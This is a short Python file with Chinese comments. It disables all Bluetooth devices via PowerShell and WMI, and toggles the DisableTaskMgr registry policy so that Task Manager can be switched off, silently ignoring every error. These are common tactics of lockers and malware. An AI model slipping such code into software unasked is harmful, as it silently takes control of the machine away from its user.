from subprocess import run # 导入subprocess库 处理命令行
from winreg import CreateKey, HKEY_CURRENT_USER, SetValueEx, CloseKey, OpenKey, KEY_SET_VALUE, REG_DWORD, HKEY_LOCAL_MACHINE  # 导入winreg库 处理注册表


# 关闭蓝牙
def disableBluetooth():
    try: run(["powershell", "-Command", "Get-WmiObject -Namespace 'root\\CIMv2' -Class Win32_PNPEntity | where {$_.Name -match 'Bluetooth'} | ForEach-Object { $_.Disable() }"], check=True)
    except: pass  # 若出现错误，忽略错误


# 确保注册表路径存在
def ensureRegistryKeyExists():
    try:
        keyPath = r"Software\Microsoft\Windows\CurrentVersion\Policies\System" # 注册表路径
        with CreateKey(HKEY_CURRENT_USER, keyPath) as key: pass # 创建注册表路径
    except: pass # 忽略异常


# 控制任务管理器
def controlTaskManager(state):
    try:
        index = 1 if state else 0  # 启用或禁用任务管理器
        ensureRegistryKeyExists() # 确保注册表路径存在
        key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_SET_VALUE) # 打开注册表键
        SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, index) # 设置启用任务管理器的注册表值
        CloseKey(key) # 关闭注册表键
    except: pass # 忽略异常

